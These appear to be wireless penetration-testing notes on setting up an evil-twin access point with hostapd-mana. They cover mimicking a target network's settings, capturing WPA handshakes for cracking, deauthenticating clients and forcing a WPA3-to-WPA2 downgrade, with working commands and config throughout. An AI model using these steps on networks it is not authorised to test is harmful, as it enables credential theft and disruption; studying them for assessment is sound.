### Introduction
---
Rogue access points can be:
1. Unauthorized APs plugged into the target network.
2. Malicious APs that mimics the target network.
Here we will be using the second definition for the upcoming attacks.

Clients will connect (reconnect) to a familiar network (by recognizing the ESSID). By advertising the same ESSID of the target AP with a stronger signal, the client may attempt to connect to our rogue AP to obtain the first 2 messages of the 4-way handshake for cracking the PSK.

Useful to capture handshakes & target clients that are far away from the AP.

### Enumeration
---
Some clients will also check for the encryption details of the AP, alongside the ESSID. Thus, the best approach is to mimic both.

To obtain the encryption details, we can use airodump-ng:
```
sudo airodump-ng -w [output name] --output-format pcap wlan0mon
```

Example Output:
```
CH 12 ][ Elapsed: 0 s ][ 2020-08-14 16:23 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 FC:7A:2B:88:63:EF  -53        5        0    0   1  130   WPA2 CCMP   PSK  Mostar
```
- Look for client `Probes` - we may create a rogue AP based on this ESSID too.

From the above information, we can deduce that Mostar is using 802.11n:
- WPA2-PSK
- CCMP
- 130 Mbit
- Channel 1
Try to match these settings as closely as possible.

##### Packet Inspection:
Airodump-ng only shows the highest encryption. We can extract more information in Wireshark. Open the output Pcap file and using the following filter:
```
wlan.fc.type_subtype == 0x08 && wlan.ssid == "[essid]"
```

Under `IEEE 802.11 Wireless Management` -> `Tagged parametters`, check:
- WPA Information Element
	- I.e., Supports WPA1
	- Check for TKIP & CCM (i.e., CCMP)
- RSN Information
	- I.e., Supports WPA2
	- Check for TKIP & CCM (i.e., CCMP)

### Creating a Rogue AP
---
##### hostapd-mana
hostapd is a tool to create APs using Wi-Fi adapters. Hostapd runs in 802.11b in default.
```
sudo apt install hostapd-mana
```
###### Building the Config file:
```
nano hostapd.conf
```

The insert the following:
```
interface=wlan0
ssid=[essid]
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/[essid].hccapx
```
- Change `ssid` to the Wi-Fi name.
- Set `hw_mode` to `g` for 2.4GHz, and `a` for 5GHz.
- Set `ieee80211n` to 1 for enabling 802.11n. 
- Set `wpa` to 3 for supporting both WPA1 & 2. 
- Set `wpa_key_mgmt` to WPA-PSK. `wpa_passphrase` must be present.
- Set `wpa_pairwise` and `rsn_pairwise` for the encryption details of WPA1 & 2 respectively.
- Set `mana_wpaout` for where to output the capture files.

### Capturing Handshakes
---
```
sudo hostapd-mana hostapd.conf
```
- Look for `MANA: Captured a WPA/2 handshake from:`

If the client hang on to a weak connection with the target AP, we can perform a de-auth attack to disconnect the client from the AP, and connect to us.
- Another Wi-Fi interface is required to perform de-auth attack.
```
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

Crack the captured handshake with aircrack-ng / hashcat.

### WPA3
---
While WPA3 is not crack-able, we may be able to trick the clients into downgrading to WPA2 connection by creating an AP with only WPA2 & 802.11w set to "optional".

In hostapd.config, set the followings:
- Set `wpa=2`
- Delete `wpa_pairwise`
- Set `rsn_pairwise=CCMP`
- Add`ieee80211w=1`
- Set `wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256`